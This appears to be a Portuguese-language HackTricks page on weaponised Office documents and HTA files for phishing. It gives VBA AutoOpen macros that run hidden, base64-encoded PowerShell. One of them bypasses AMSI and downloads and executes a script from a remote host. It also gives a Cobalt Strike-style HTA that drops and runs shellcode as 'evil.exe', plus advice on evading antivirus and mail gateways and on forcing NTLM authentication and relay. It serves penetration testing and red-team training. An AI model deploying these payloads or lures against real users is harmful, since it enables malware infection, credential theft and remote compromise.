# Arquivos e Documentos de Phishing

{{#include ../../banners/hacktricks-training.md}}

## Documentos do Office

O Microsoft Word realiza a validação de dados do arquivo antes de abrir um arquivo. A validação de dados é realizada na forma de identificação da estrutura de dados, em conformidade com o padrão OfficeOpenXML. Se ocorrer algum erro durante a identificação da estrutura de dados, o arquivo sendo analisado não será aberto.

Normalmente, arquivos do Word que contêm macros usam a extensão `.docm`. No entanto, é possível renomear o arquivo alterando a extensão do arquivo e ainda manter suas capacidades de execução de macro.\
Por exemplo, um arquivo RTF não suporta macros, por design, mas um arquivo DOCM renomeado para RTF será tratado pelo Microsoft Word e será capaz de executar macros.\
Os mesmos internos e mecanismos se aplicam a todo o software do Microsoft Office Suite (Excel, PowerPoint etc.).

Você pode usar o seguinte comando para verificar quais extensões serão executadas por alguns programas do Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files que referenciam um modelo remoto (Arquivo – Opções – Suplementos – Gerenciar: Modelos – Ir) que inclui macros podem “executar” macros também.

### Carregamento de Imagem Externa

Vá para: _Inserir --> Partes Rápidas --> Campo_\
&#xNAN;_**Categorias**: Links e Referências, **Nomes de arquivo**: includePicture, e **Nome do arquivo ou URL**:_ http://\<ip>/whatever

![](<../../images/image (155).png>)

### Backdoor de Macros

É possível usar macros para executar código arbitrário do documento.

#### Funções de Autoload

Quanto mais comuns forem, mais provável é que o AV as detecte.

- AutoOpen()
- Document_Open()

#### Exemplos de Código de Macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Remover metadados manualmente

Vá para **Arquivo > Informações > Inspecionar Documento > Inspecionar Documento**, o que abrirá o Inspetor de Documentos. Clique em **Inspecionar** e depois em **Remover Tudo** ao lado de **Propriedades do Documento e Informações Pessoais**.

#### Extensão do Documento

Quando terminar, selecione o dropdown **Salvar como tipo**, mude o formato de **`.docx`** para **Word 97-2003 `.doc`**.\
Faça isso porque você **não pode salvar macros dentro de um `.docx`** e há um **estigma** **em torno** da extensão habilitada para macros **`.docm`** (por exemplo, o ícone da miniatura tem um enorme `!` e alguns gateways web/email os bloqueiam completamente). Portanto, essa **extensão legada `.doc` é o melhor compromisso**.

#### Geradores de Macros Maliciosas

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Arquivos HTA

Um HTA é um programa do Windows que **combina HTML e linguagens de script (como VBScript e JScript)**. Ele gera a interface do usuário e é executado como um aplicativo "totalmente confiável", sem as restrições do modelo de segurança de um navegador.

Um HTA é executado usando **`mshta.exe`**, que geralmente é **instalado** junto com **Internet Explorer**, tornando **`mshta` dependente do IE**. Portanto, se ele foi desinstalado, os HTAs não poderão ser executados.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forçando a Autenticação NTLM

Existem várias maneiras de **forçar a autenticação NTLM "remotamente"**, por exemplo, você poderia adicionar **imagens invisíveis** a e-mails ou HTML que o usuário acessará (até mesmo HTTP MitM?). Ou enviar à vítima o **endereço de arquivos** que irão **disparar** uma **autenticação** apenas por **abrir a pasta.**

**Verifique essas ideias e mais nas páginas a seguir:**

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Revezamento NTLM

Não se esqueça de que você não pode apenas roubar o hash ou a autenticação, mas também **realizar ataques de revezamento NTLM**:

- [**Ataques de Revezamento NTLM**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (revezamento NTLM para certificados)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

{{#include ../../banners/hacktricks-training.md}}
